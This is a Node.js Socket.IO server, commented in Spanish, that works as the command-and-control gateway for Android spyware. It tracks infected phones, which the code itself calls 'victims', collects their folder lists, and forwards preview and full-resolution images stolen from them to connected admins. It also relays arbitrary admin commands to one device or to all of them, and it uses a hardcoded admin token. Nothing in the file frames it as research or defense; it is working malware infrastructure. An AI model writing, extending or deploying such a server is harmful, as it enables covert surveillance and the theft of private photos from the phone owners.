const express = require('express');
const http = require('http');
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

// AQUÍ AGREGAMOS LA LÍNEA MÁGICA
const io = new Server(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"] 
    },
    maxHttpBufferSize: 1e8, // 100 MB para subir fotos HD
    allowEIO3: true         // <--- CRÍTICO PARA COMPATIBILIDAD CON ANDROID
});

// ALMACENAMIENTO INTELIGENTE
let admins = new Set();
let victims = {}; 
let deviceMap = {}; 

io.on('connection', (socket) => {
    
    // 1. IDENTIFICACIÓN
    const type = socket.handshake.auth.type;
    const token = socket.handshake.auth.token;

    if (type === 'admin' && token === 'admin123') {
        console.log('[ADMIN] Conectado:', socket.id);
        admins.add(socket.id);
        socket.emit('update_device_list', victims);
    } 

    // 2. REGISTRO DE VÍCTIMA (CELULAR)
    socket.on('usrData', (data) => {
        if (data.deviceId) {
            const uniqueId = data.deviceId;

            // DETECCIÓN DE DUPLICADOS (LÓGICA LIMPIA)
            if (deviceMap[uniqueId] && deviceMap[uniqueId] !== socket.id) {
                const oldSocketId = deviceMap[uniqueId];
                delete victims[oldSocketId];
                // Intentamos desconectar el socket viejo para que no gaste recursos
                const oldSocket = io.sockets.sockets.get(oldSocketId);
                if(oldSocket) oldSocket.disconnect(true);
            }

            deviceMap[uniqueId] = socket.id;
            
            victims[socket.id] = {
                name: data.deviceName || "Unknown",
                id: uniqueId,
                socketId: socket.id,
                folders: data.folders || []
            };

            broadcastVictims();
        }

        // REENVÍO DE DATOS
        if (data.dataType === 'preview_image') {
            io.to(Array.from(admins)).emit('new_preview', { ...data, victimId: socket.id });
        } 
        else if (data.dataType === 'full_image') {
            io.to(Array.from(admins)).emit('receive_full', { ...data, victimId: socket.id });
        }
        else if (data.dataType === 'folder_list') {
            if (victims[socket.id]) {
                victims[socket.id].folders = data.folders;
                broadcastVictims();
            }
        }
    });

    // 3. COMANDOS DEL ADMIN
    socket.on('admin_command', (cmd) => {
        if (!admins.has(socket.id)) return; 

        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action, cmd);
        } else {
            io.to(cmd.target).emit('command_' + cmd.action, cmd);
        }
    });
    
    socket.on('order_download', (data) => {
        io.to(data.target).emit('request_full_image', data);
    });

    // 4. DESCONEXIÓN
    socket.on('disconnect', () => {
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log('[ADMIN] Desconectado');
        } else {
            if (victims[socket.id]) {
                const devId = victims[socket.id].id;
                delete deviceMap[devId];
                delete victims[socket.id];
                broadcastVictims();
                console.log('[VICTIM] Desconectado:', socket.id);
            }
        }
    });
});

function broadcastVictims() {
    io.to(Array.from(admins)).emit('update_device_list', victims);
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`GATEWAY V2.1 (EIO3 ENABLED) RUNNING ON PORT ${PORT}`);
});
